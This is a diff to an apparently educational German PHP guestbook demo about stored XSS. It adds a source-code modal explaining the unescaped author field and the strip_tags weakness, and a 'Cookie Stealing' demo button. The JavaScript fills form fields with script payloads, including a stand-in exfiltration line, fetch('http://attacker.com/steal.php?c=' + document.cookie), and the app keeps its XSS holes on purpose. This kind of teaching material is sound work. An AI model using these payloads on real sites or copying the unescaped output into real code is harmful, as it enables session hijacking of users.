@@ -34,6 +34,9 @@ function getEntries(Guestbook $gb) {
 
             <div class="main-layout">
                 <div class="left-column">
+                    <div class="source-code-section">
+                        <button onclick="toggleSourceCode(); return false;" class="btn-source-code">📄 Quellcode anzeigen</button>
+                    </div>
                     <div class="entries-container">
 
             <?php
@@ -64,20 +67,39 @@ EOT;
                 <div class="demo-links">
                     <a href="clearsession.php" class="demo-link reset">Angriffsdaten löschen</a>
                     <a href="#" onclick="xssAttackName(); return false;" class="demo-link">
-                        XSS Username
+                        <div class="demo-link-content">
+                            <div class="demo-link-title">XSS Username</div>
+                            <div class="xss-type-badge stored">Stored XSS</div>
+                        </div>
                         <span class="attack-status success">Erfolgreich</span>
                     </a>
                     <a href="#" onclick="xssAttackMessageStripOk(); return false;" class="demo-link">
-                        XSS Message (strip_tags OK)
+                        <div class="demo-link-content">
+                            <div class="demo-link-title">XSS Message (strip_tags OK)</div>
+                            <div class="xss-type-badge stored">Stored XSS</div>
+                        </div>
                         <span class="attack-status blocked">Verhindert</span>
                     </a>
                     <a href="#" onclick="xssAttackMessageStripFail(); return false;" class="demo-link">
-                        XSS Message (strip_tags FAIL)
+                        <div class="demo-link-content">
+                            <div class="demo-link-title">XSS Message (strip_tags FAIL)</div>
+                            <div class="xss-type-badge stored">Stored XSS</div>
+                        </div>
                         <span class="attack-status success">Erfolgreich</span>
                     </a>
                     <a href="#" onclick="xssAttackMessageStripHtmlSCIsSafe(); return false;" class="demo-link">
-                        XSS htmlspecialchars is safe
+                        <div class="demo-link-content">
+                            <div class="demo-link-title">XSS htmlspecialchars is safe</div>
+                            <div class="xss-type-badge stored">Stored XSS</div>
+                        </div>
                         <span class="attack-status blocked">Verhindert</span>
+                    </a>
+                    <a href="#" onclick="xssAttackCookieStealing(); return false;" class="demo-link">
+                        <div class="demo-link-content">
+                            <div class="demo-link-title">Cookie Stealing</div>
+                            <div class="xss-type-badge stored">Stored XSS - Advanced</div>
+                        </div>
+                        <span class="attack-status success">Erfolgreich</span>
                     </a>
                 </div>
                     </div>
@@ -116,7 +138,60 @@ EOT;
             </div>
         </div>
 
+        <!-- Source Code Modal -->
+        <div id="sourceCodeModal" class="modal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h2>📄 Guestbook Quellcode (index.php)</h2>
+                    <span class="close" onclick="toggleSourceCode()">&times;</span>
+                </div>
+                <div class="modal-body">
+                    <p class="source-explanation">Kritische Stellen sind farblich hervorgehoben:</p>
+                    <pre class="source-code"><code><span class="code-comment">// Zeile 40-44: Ausgabe der Gästebucheinträge</span>
+foreach ($entries as $e) {
+    <span class="code-unsafe">$msg = strip_tags($e->getMessage(), '&lt;b&gt;&lt;p&gt;&lt;u&gt;&lt;i&gt;');</span>  <span class="code-comment">// ⚠️ TEILWEISE UNSICHER!</span>
+    <span class="code-unsafe">$author = $e->getAuthor();</span>  <span class="code-comment">// ❌ UNSICHER - Kein Escaping!</span>
+    <span class="code-safe">$email = htmlspecialchars($e->getEmail());</span>  <span class="code-comment">// ✓ SICHER</span>
+    <span class="code-safe">$date = htmlspecialchars($e->getEntryDate());</span>  <span class="code-comment">// ✓ SICHER</span>
+    echo "&lt;div class='gbentry'&gt;";
+    echo "  &lt;div class='gbentry-message'&gt;<span class="code-unsafe">$msg</span>&lt;/div&gt;";
+    echo "  &lt;div class='gbentry-meta'&gt;";
+    echo "    &lt;span&gt;<span class="code-unsafe">$author</span>&lt;/span&gt;";  <span class="code-comment">// ❌ XSS möglich!</span>
+    echo "    &lt;span&gt;$email&lt;/span&gt;";
+    echo "  &lt;/div&gt;";
+    echo "&lt;/div&gt;";
+}
+
+<span class="code-comment">// Probleme:</span>
+<span class="code-comment">// 1. $author wird NICHT escaped → XSS möglich</span>
+<span class="code-comment">// 2. strip_tags() entfernt Tags, aber NICHT Event-Handler wie onmouseover</span>
+<span class="code-comment">// 3. Erlaubte Tags (&lt;u&gt;, &lt;i&gt;, etc.) können für XSS missbraucht werden</span>
+
+<span class="code-comment">// Lösung:</span>
+<span class="code-safe">$author = htmlspecialchars($e->getAuthor());</span>  <span class="code-comment">// ✓ Macht es sicher!</span>
+<span class="code-safe">$msg = htmlspecialchars($e->getMessage());</span>  <span class="code-comment">// ✓ Alternative: Alles escapen</span></code></pre>
+                </div>
+            </div>
+        </div>
+
         <script>
+            function toggleSourceCode() {
+                var modal = document.getElementById('sourceCodeModal');
+                if (modal.style.display === 'block') {
+                    modal.style.display = 'none';
+                } else {
+                    modal.style.display = 'block';
+                }
+            }
+
+            // Close modal when clicking outside
+            window.onclick = function(event) {
+                var modal = document.getElementById('sourceCodeModal');
+                if (event.target == modal) {
+                    modal.style.display = 'none';
+                }
+            }
+
             function xssAttackName() {
                 document.forms.gbform.elements.yourname.value = "<script>alert('XSS im Namen!');<\/script>";
                 document.forms.gbform.elements.email.value = "angreifer@example.com";
@@ -136,6 +211,11 @@ EOT;
                 document.forms.gbform.elements.yourname.value = "Erfolgloser Angreifer";
                 document.forms.gbform.elements.email.value = "test@example.com <script>alert('XSS');<\/script>";
                 document.forms.gbform.elements.message.value = "Versuch: XSS über Email-Feld. htmlspecialchars() wandelt < und > in HTML-Entities um, daher ist dies SICHER.";
+            }
+            function xssAttackCookieStealing() {
+                document.forms.gbform.elements.yourname.value = "<script>alert('Cookie Stealing Demo:\\n\\nCookies: ' + document.cookie + '\\n\\nIn einem echten Angriff würden diese Daten an einen Angreifer-Server gesendet:\\nfetch(\\'http://attacker.com/steal.php?c=\\' + document.cookie)');<\/script>";
+                document.forms.gbform.elements.email.value = "advanced-attacker@evil.com";
+                document.forms.gbform.elements.message.value = "ADVANCED: Cookie-Stealing Angriff. In einem echten Szenario würde das Script die Session-Cookies des Opfers an einen Angreifer-Server senden. Dies ermöglicht Session Hijacking!";
             }
         </script>
     </body>
